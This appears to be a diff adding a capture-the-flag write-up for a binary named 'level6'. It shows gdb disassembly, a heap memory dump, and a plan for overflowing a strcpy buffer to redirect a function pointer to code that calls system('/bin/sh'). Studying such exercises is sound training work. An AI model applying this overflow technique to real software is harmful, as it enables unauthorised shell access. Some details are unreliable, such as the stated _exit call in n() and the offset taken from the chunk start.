@@ -1,1 +1,83 @@
 ## after reviewing the program using gdb system
+when we start to execute the program without arguments we have the following output
+
+```bash
+$ ./level6
+segmentation fault (core dumped)
+```
+and with arguments we have the following output
+
+```bash
+$ ./level6 1234
+Nope
+```
+
+that's because the program expects an argument and we didn't provide one.
+
+
+after review the program using gdb system and we disas main function 
+
+in the main function we have 
+
+```bash
+(gdb) disas main
+```
+we see that main allocates a buffer of 64 bytes and 4 bytes for pointer to the function, then it asigns the pointer to the function and then it calls strcpy that copies the argument to the buffer and then it calls the function pointer.
+
+we check the code segment of the program to see if there's anthing interesting and we found two functions the first one is the function m()
+that is a function that puts the string "Nope" to the stdout and then returns and the second function is the function n() that calls system("/bin/sh") and then calls _exit(1) to terminate the process.
+
+```bash 
+disas m
+Dump of assembler code for function m:
+   0x08048468 <+0>:     push   %ebp
+   0x08048469 <+1>:     mov    %esp,%ebp
+   0x0804846b <+3>:     sub    $0x18,%esp
+   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:    call   0x8048360 <puts@plt>
+   0x0804847a <+18>:    leave  
+   0x0804847b <+19>:    ret    
+End of assembler dump.
+
+disass n
+Dump of assembler code for function n:
+   0x08048454 <+0>:     push   %ebp
+   0x08048455 <+1>:     mov    %esp,%ebp
+   0x08048457 <+3>:     sub    $0x18,%esp
+   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
+   0x08048461 <+13>:    call   0x8048370 <system@plt>
+   0x08048466 <+18>:    leave  
+   0x08048467 <+19>:    ret    
+End of assembler dump.
+```
+after reviewing the program we can see that the program is vulnerable to buffer overflow because the function strcpy does not check the size of the input and it copies the input to the buffer without checking if it fits in the buffer.
+
+that we will help us to overwrite the pointer to the function and make it point to the function n() that will call system("/bin/sh").
+
+this is the following plan to exploit the program:
+
+```bash
+BUFFER (64 bytes)
+┌──────────────────────────┐
+│ AAAAAAAAAAAAAAAAAAAAAAAA │ fill the buffer with 64 bytes of A's
+└──────────────────────────┘
+FUNCTION POINTER (4 bytes)
+┌──────────────┐
+│ ??? ??? ???  │  ← gets overwritten chnage it from the address of m() to the address of n()
+└──────────────┘
+```
+
+but when we see the memory layout of the program when the buffer and the pointer located in the heap we see there is more than 64 bytes between the buffer and the pointer to the function so we need to fill the buffer with more than 64 bytes to reach the pointer to the function.
+
+```bash
+(gdb) x/24xw 0x804a000
+0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
+0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
+0x804a050:      0x08048468      0x00000000      0x00000000      0x00020fa9
+```
+
+here every address is 4 bytes and we can see that the buffer is located at 0x804a000 and the pointer to the function is located at 0x804a050 so we need to fill the buffer with 80 bytes to reach the pointer to the function.
+
